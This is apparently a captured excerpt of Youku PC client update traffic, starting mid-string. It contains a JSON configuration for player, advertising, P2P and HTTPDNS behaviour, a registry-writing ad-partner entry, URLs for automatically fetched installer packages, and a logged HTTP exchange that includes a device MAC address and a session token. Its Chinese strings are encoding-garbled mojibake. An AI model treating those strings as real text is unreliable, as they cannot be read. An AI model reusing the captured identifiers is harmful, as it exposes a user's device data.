imeAfterFrameToRequestPreUps":20,"maxlogsize":"500","h265_live":1,"gpu_decode":1,"addr":["ups.youku.com"],"errorcode_retry_cef":"1000-96","updateUrlSpace_m":300,"gpu_blacklist":"AMD Radeon \u0028TM\u0029 R5 M335,AMD Radeon R5 M335","local_gpu_use_cfg":1,"errorcode_noreport":"2905-0x40010004,2905-0x00000103","playlist_get_retry":"2,1","hls":1,"cpu_limite":60,"acc_on":{"play":1,"download":0,"live":1},"fake":0,"loading_tips":{"duration":10,"times":10,"pos":3,"contents":["浣犵煡閬撳悧锛屽悓鏃舵寜浣廇lt+A鍙互蹇�熷叧闂挱鏀惧櫒"],"switch":0},"play_ability":4352},"ad_strategy":{"ad_mode":1,"live_ad_disable":0,"ad_rand":"122ab","strategies":[{"play_type":"front|post|pause","keep_use_date":9999,"nu_ad_time":0,"ad_video_index":0,"ad_play_times":99999,"max_piece":2,"invalid_period":""}],"ad_control":0,"replay_control":0,"vip_control":0,"replay_free_tspan":-1,"regs":[{"path":"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\YoukuClient\\Partner","type":"!set","value":"ywebitudoubanner,ywebitudouupgrade"}]},"skin_peeler":{},"ykpageQml_config":{"control_threads_part_size":false,"checkAcc":true,"use_new_login_url":true,"part_size":307200,"oupload":true,"threads":8,"auto_update_interval":0,"load_feed_stream":false,"qml_use_opengl":false,"homepage_load_type":1,"useCacheIn":150,"channel_list_not_use_cache":false,"overdueTime":3,"channel_page_not_use_cache":false},"play_core":{"adaptive_bitrate":{"pattaya_seek_gear_index":"-2","pattaya_start_play_timeout_limit":"2","pattaya_max_loading_count":"5","pattaya_ups_cost_for_hd2":"2000","pattaya_preload_select_start":"1","pattaya_ups_cost_for_hd3":"1000","pattaya_using_netcache_buffer_state":"1","pattaya_enable_p2p_speed":"1","pattaya_start_need_low_buffer":"0","pattaya_start_play_gear_index":"4","pattaya_sd_up_gear_need_buffer":"0","pattaya_ups_cost_for_hd":"5000","pattaya_start_need_mid_buffer":"0","pattaya_seek_need_mid_buffer":"0","pattaya_hd2_up_gear_need_buffer":"90","pattaya_m3u8_download_first":"0","pattaya_seek_play_timeout_limit":"2","pattaya_4k_cpu_using_limit":10,"pattaya_fast_start_playing":"1","pattaya_hd_up_gear_need_buffer":"60","pattaya_fast_start_in_netcache":"1","pattaya_down_first_gear_timeout":"0","pattaya_fast_start_playing_max_count":"5","pattaya_seek_need_low_buffer":"0","pattaya_enable_ups_cost":"0","pattaya_lowest_gear_index":"2","pattaya_vv_gear_continue":"1","pattaya_fast_mode_speed_factor":"3","source_adaptive_mode":"1","pattaya_time_out_safe_buffer":"60","pattaya_enable_audio_speed":"0","pattaya_fast_change_gear":"1","pattaya_last_speed_factor":"2.2","pattaya_hd3_up_gear_need_buffer":"120","pattaya_using_seek_in_buffer":"0","pattaya_start_and_seek_time_out_factor":"0","pattaya_normal_play_timeout_limit":"5","pattaya_fast_start_speed_factor":"2","pattaya_higest_gear_control_str":"-1,0:0,23:59","iku_aliplayer_log_level":0},"network_retry_config_live":{"cdn_read_timeout":"25","key_timeout":"4,8,16","cdn_timeout":"4,4,8","buffertime_before_play":"4","buffertime_playing":"4"},"network_proto_info":{"iku_smart_dns_enable":"1"},"player_engine_buffer":{"cdn_read_timeout":"25","key_timeout":"4,8,16","cdn_timeout":"4,4,8","buffertime_before_play":"12","buffertime_playing":"12"}},"player_upgrade":{},"hover_wnd_config":{"play":0,"show":0},"feedback":{"dialog":{"play":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"瑙傜湅杩囩▼涓紝鐢婚潰涓�鍗′竴鍗?},{"id":2,"sort":2,"content":"瑙傜湅杩囩▼涓紝缁忓父鍑虹幇杞湀"},{"id":3,"sort":3,"content":"瑙傜湅鏃跺嚭閿?},{"id":4,"sort":4,"content":"澹伴煶鐢婚潰涓嶅悓姝ョ瓑褰遍煶闂"},{"id":5,"sort":5,"content":"瑙傜湅杩囩▼涓紝鍑虹幇榛戝睆"},{"id":6,"sort":6,"content":"鎾斁杩囩▼涓紝鏈夎烦鎾幇璞?},{"id":7,"sort":7,"content":"鎾斁鏃剁郴缁熻祫婧愬崰鐢ㄥお楂?},{"id":8,"sort":8,"content":"鍏朵粬鎾斁闂"}]},"download":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"涓嬭浇閫熷害鎱?},{"id":2,"sort":2,"content":"涓嬭浇瑙嗛娓呮櫚搴︿笌鎵�閫夋竻鏅板害涓嶇"},{"id":3,"sort":3,"content":"涓嬭浇閿欒1009"},{"id":4,"sort":4,"content":"鏃犳硶涓嬭浇"},{"id":5,"sort":5,"content":"宸叉槸浼氬憳锛屾棤娉曚笅杞戒細鍛樿棰?},{"id":6,"sort":6,"content":"涓嬭浇鎶ラ敊"}]},"upload":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"涓婁紶瑙嗛澶辫触"},{"id":2,"sort":2,"content":"涓婃鍚庝竴鐩翠笂浼犱腑"},{"id":3,"sort":3,"content":"涓婁紶鍚庝竴鐩村鏍镐腑"},{"id":4,"sort":4,"content":"涓婁紶瑙嗛妯＄硦"},{"id":5,"sort":5,"content":"涓嶄細涓婁紶瑙嗛"},{"id":6,"sort":6,"content":"鎵句笉鍒颁笂浼犵殑瑙嗛"}]},"transcode":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"鏈�缁堣浆鎹㈡牸寮忎笉姝ｇ‘"},{"id":2,"sort":2,"content":"杞爜鍚庢挱鏀句笉姝ｅ父"},{"id":3,"sort":3,"content":"鏄剧ず杞爜澶辫触"},{"id":4,"sort":4,"content":"涓�鐩磋浆鐮佷腑"},{"id":5,"sort":5,"content":"涓嶄細杞爜"},{"id":6,"sort":6,"content":"杞爜鍚庤棰戞壘涓嶅埌"}]},"multiscreen":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"鎶曞睆澶辫触"},{"id":2,"sort":2,"content":"娌℃湁鎶曞睆鎸夐挳"},{"id":3,"sort":3,"content":"璁惧涓嶅吋瀹?},{"id":4,"sort":4,"content":"鎶曞睆鍚庢棤娉曟搷浣?},{"id":5,"sort":5,"content":"鍏朵粬鎶曞睆闂"}]},"login":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"鐧诲綍鐣岄潰鎻愮ず'椤甸潰鍔犺浇澶辫触'"},{"id":2,"sort":2,"content":"鏃犳硶浣跨敤绗笁鏂圭櫥褰?},{"id":3,"sort":3,"content":" '椤甸潰鍔犺浇澶辫触',璇疯缃叕鍏盌NS鍚庡啀璇曚竴璇?},{"id":4,"sort":4,"content":"鐧诲綍鐣岄潰绌虹櫧,璇疯缃叕鍏盌NS鍚庡啀璇曚竴璇?},{"id":5,"sort":5,"content":"鏃犳硶鍙栨秷鑷姩鐧诲綍"},{"id":6,"sort":6,"content":"鎻愮ず'鍦ㄧ櫥褰曚腑'"},{"id":7,"sort":7,"content":"璁剧疆姝ｇ‘鐨勭數鑴戞棩鏈熷悗浠嶇劧鎻愮ず'Page failed .'"},{"id":8,"sort":8,"content":"鍕鹃�?璁颁綇鎴?鍚庝粛涓嶈兘鑷姩鐧诲綍"}]}},"logupload_err":{}},"fogcomputing_ctrl":{"timeAyn_on":"0","ver":"","p2pconnect_timeout":"5","target_report_times":"2","statechg_deal":"0","report_timerange":"00:00-00:01","resend_msg_timer_s":"10","upload_space_m":"10","autobc_space_m":"1","url":"http://pcclient.download.youku.com/fogcomputing/fogcomputing_setup_1.0.0.1152.exe","max_connect_count":"10","balance_childNum":"2000","destver":"","retry_times":"1","adjustchildnum_space_m":"20","blacklist_num":"20","resend_msg_vailed_s":"180","be_rootback_accsnum":"5","blacklist_on":"0","sign_space_m":"10","parent_num":"1","on":"0","accsmsg_num":"3","md5":"BF4BE8F3B51FBE188550BD303683DD11"},"download":{"monitor_error":1,"downLoadUseHls":1,"ups_retry":"2,20,1","ups_requst_http":1,"force_use_cdn":1,"cdn_connect_fresh":1,"check_slice_file":1,"cdn_conn_retry":2,"ups_request_interval":480,"cdn_connect_timeout":60,"merge_kux_format":1},"download_upgrade":{},"base_config":{"plugin_upgrade":0,"show_playleft":1,"show_appdownimage":0,"tlog_on":2,"baobiao_install":1,"custom_domains":"ACCS_DOMAIN_CUSTOM_TAOBAO_ECOMMERCE=openacs.m.taobao.com,msgacs.wapa.taobao.com,msgacs.waptest.taobao.com","1080p_on":1,"check_ykpage_running":"0","pop_dlg":{"pop_dlg_laifeng":0},"install_space_d":1,"no_new_singleton":0,"play_live_mode":"native","survey_url":"","search_page_type":1,"plugin_upgrade_uac":0,"download_server":1,"use_local_record":1,"plugin_autorun":1,"tlog_module":"playcore,pcdn,login","desklink_push":"iku://|interface|gochannel|push|id|1003|","multi_accs":"1","vip_entrance_visible":"show","pay_channpre_text":"鎮ㄥ彲浠ュ厤璐硅瘯鐪?1%2锛屽紑閫氶閬撲細鍛樺悗鍙鐪嬪叏閮?,"star_more_s":10,"homepage_load_type":1,"fixed_domains":"ACCS_DOMAIN_YOUKU,ACCS_DOMAIN_CUSTOM_TAOBAO_ECOMMERCE","kujam":0,"kdwaitTimeout":2000},"treasure_box":{},"live_config":{},"play_ctrl":{"report_space_s":60,"action_on":1,"report_on":1},"youkuplayer_upgrade":{},"hb_playmiddle":{},"miniq_upgrade":{"destver":"7.3.4.4233","url":"http://pcclient.download.youku.com/push_mini/push_mini_setup_7.3.4.4233.exe","md5":"E03920C7A381E41EDD69A12B4CD02609"},"clarity_contral":{},"miniq_cfg":{"defaultqulity":"hd2","err":[{"show_iku_btn":0,"err_txt":"璇ヨ棰戜粎瀵逛紭閰蜂細鍛樺紑鏀撅紝璇风櫥褰曚細鍛樻垨璐拱浼氬憳","show_retry_btn":1,"err_code":["1000-37","3000-2","3001-2","3002-2","3003-2","3100-2","3101-2"]},{"show_iku_btn":1,"err_txt":"鏋侀�熺増鏆備笉鏀寔鐢ㄥ埜瑙嗛锛岃鐢ㄤ紭閰峰畬鏁寸増瑙傜湅","show_retry_btn":0,"err_code":["3000-3","3001-3","3002-3","3003-3","3100-3","3101-3","3102-1"]},{"show_iku_btn":1,"err_txt":"鏋侀�熺増鏆備笉鏀寔drm瑙嗛锛岃鐢ㄤ紭閰峰畬鏁寸増瑙傜湅","show_retry_btn":0,"err_code":["1000-96","1000-97"]}],"loading_tips":{"duration":10,"times":10,"pos":3,"contents":["灏忕煡璇嗭細瑙嗛鍒楄〃鍙互鎷栧埌灞忓箷杈圭紭鍋滈潬闅愯棌"],"switch":0}},"leftnavigation_top":{"hand_refresh_span":"90","showmatch":"0","eightfinals":"3","netinerfaceorigin":"1","worldcup_online_num":"8"},"left_navigation":{},"push_upgrade":{},"sub_player":{},"push_mini_upgrade":{},"third_player_conf":{"domain_black_list":[],"domain_write_list":[".iqiyi.com/v_"]},"httpdns":{"domains_v4":"","domains":"","refresh":"600","srv_refresh":"0","content":"MTA3MDI1fGU0MTQ4M2E4Y2MwNDdkODRlMjhiMjUzYzMxOTI0NGMw","ip_refresh":"3600","time_out_ms":"10000","disable_flag":"0x0000","retry_count":"6","domains_v6":"","https":"0","error_report":"0","cache_time_s":"300","force_use_opendns":"0","on":"1"},"feisuo_ctrl":{"p2p_timeout":"20000","p2p_switch_device_max_count":"10","download_push_data":"0","p2p_protect_create_duration":"20","heart_report_space_m":"3","publish_use_origin_vid":"1","p2p_upload_check_duration":"60","p2p_connected_ctrl":"0","check_ts_valid_interval":"0","push_download_speed":"0","p2p_report_connect_chg":"0","report_unpublish_info":"0","p2p_limite_peer_cnt":"9999","data_size":"2000","report_file_event_info":"0","use_p2p_at_busy_time":"0","watch_share_rate":"0","cache_size":"9000","p2p_max_connect":"180","check_ts_header":"0","md5_check_type":"1","p2p_check_connect_cnt":"20","upload_count":"12","p2p_trans_buffer_size":"16","sleep_time_ms":"0","p2p_direct_lookdev_space_s":"10","consumer_use_origin_vid":"1","push_count_min":"0","push_list_starttime":"300","report_error_log":"0","report_file_check_info":"0","cdn_busy_time":"12:00-24:00","download_time_check":"10","publish_play_video":"1","p2p_state":"0","play_cache_size":"4000","cache_check_interval":"300","p2p_down_sleep_interval_m":"1","p2p_data_filter":"0","p2p_retry_count":"1","p2p_upload_publish_interval_m":"10","p2p_data_interval":"1800","download_push_data_list":"0","p2p_start_count_2":"8","cache_detail_interval":"600","p2p_upnp_on":"1","getsize_space_s":"60","p2p_limite_look_connected_cnt":"9999","p2p_start_count":"5","new_request_origin_vid":"1","download_invalid_video":"0","p2p_hls_buffertime_type":"0"},"openapi_test":{"decodeinterfaceorigin":"1"},"youkupageqml_upgrade":{}},"e":{"code":0,"hbtime":180,"provider":"pcapp_update","play_hbtime":300,"env":"public","lastts":1620137913266,"desc":"heat strategy"}}
*/



/*
GET /check?action=install_com_add&cid=iku&ver=8.0.8.12173&pid=ywebapp&peerid=1&os=10.0&rid=83&installtype=install&mac=3E-A9-F4-82-58-24 HTTP/1.1
User-Agent: NSIS_Inetc (Mozilla)
Host: pcapp-update.youku.com
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200
Date: Fri, 04 Jun 2021 15:01:11 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 504
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
Set-Cookie: XSRF-TOKEN=3fcd87fb-8223-4050-89d9-2714274a97de; Path=/; HttpOnly
X-Application-Context: ykpcapp-update:7001
Server: Tengine/Aserver
EagleEye-TraceId: 210468d516228188710186445ea109
Strict-Transport-Security: max-age=31536000
Timing-Allow-Origin: *
s-rt: 4
EagleEye-TraceId: 210468d516228188710186445ea109

{"method":{"ikuotherfile":{"filename":"ikuinstalladd_2.7z","fileurl":"http://pcclient.download.youku.com/install_com_add/ikuinstalladd_2.7z",
"fileMd5":"F056603F06498904A5E7702CE822EFDB"},"AliProtect":{"filename":"AliProtect1.0.70.98.7z",
"fileurl":"http://pcclient.download.youku.com/install_com_add/AliProtect_1.0.70.98.7z","fileMd5":"420A4A786027B5A675B74E51561F2945"}},
"e":{"code":0,"hbtime":180,"provider":"pcapp_update","play_hbtime":300,"env":"public","lastts":1617289094931,"desc":"heat strategy"}}
*/